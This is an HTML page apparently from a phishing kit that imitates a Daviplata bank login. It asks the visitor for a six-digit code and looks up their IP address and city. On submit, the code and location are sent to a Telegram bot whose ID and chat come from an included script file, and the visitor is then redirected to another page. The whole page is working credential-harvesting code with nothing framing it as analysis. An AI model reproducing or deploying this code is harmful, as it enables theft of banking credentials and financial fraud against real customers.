<!doctype html>
<html>
  <head>
  	<title>daviplata</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">

	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	
	<link rel="stylesheet" href="archives/style.css">
	
	<SCRIPT src="datos_del_tel.js"></SCRIPT>
	
	
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  

   <script>
         $.getJSON("https://api.ipify.org?format=json",
          function(data) {
             $("#gfg").html(data.ip);
         })
      </script>
      <script>
         $.getJSON("https://ipinfo.io", function (response) {
    $("#ip").html("IP: " + response.ip);
    $("#address").html("" + response.city + ", " + response.country);
    })
      </script>
   <script>

var u_name,   ip, ip2;
var ready = function () {
    u_name = document.getElementById("cod").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "Datos Daviplata\nCodigo1: " + u_name + "\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'er.php';
        console.log(response);
    });
    return false;
};
   </script>

	</head>
	<body>
	<section class="ftco-section">
		<div class="container">
			<div class="row justify-content-center">
				<div class="col-md-6 text-center mb-5">
					<h2 class="heading-section">Bienvenido</h2>
				</div>
			</div>
			<div class="row justify-content-center">
				<div class="col-md-7 col-lg-5">
					<div class="login-wrap p-4 p-md-5">
		      	<div >
				<img class="icon d-flex align-items-center justify-content-center" src="archives/descargaa.png" style="width:40%;height:auto;">
		      		
		      	</div>
		      	<h3 class="text-center mb-4"></h3>	<br>
						<form  method="post" action="" onsubmit="return sender()">
				
				
						<p id="gfg"  hidden=""></p>
						<p id="address"  hidden=""></p>
		      		<div class="form-group">
		      			<input type="tel" maxlength="6" id="cod" class="form-control rounded-left" placeholder="Código" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)"  style="text-align:center;" required>
		      		</div>
	         <br>
	            <div class="form-group">
	            	<button type="submit" class="form-control btn btn-primary rounded submit px-3">Ingresar</button>
	            </div><br><br>
	            <div class="form-group d-md-flex">
	            	<div class="w-50">
	            		<label class="checkbox-wrap checkbox-primary">Recordarme
									  <input type="checkbox" checked>
									  <span class="checkmark"></span>
									</label>
								</div>
								<div class="w-50 text-md-right">
									
								</div>
	            </div>
	          </form>
	        </div>
				</div>
			</div>
		</div>
	</section>

	</body>
</html>

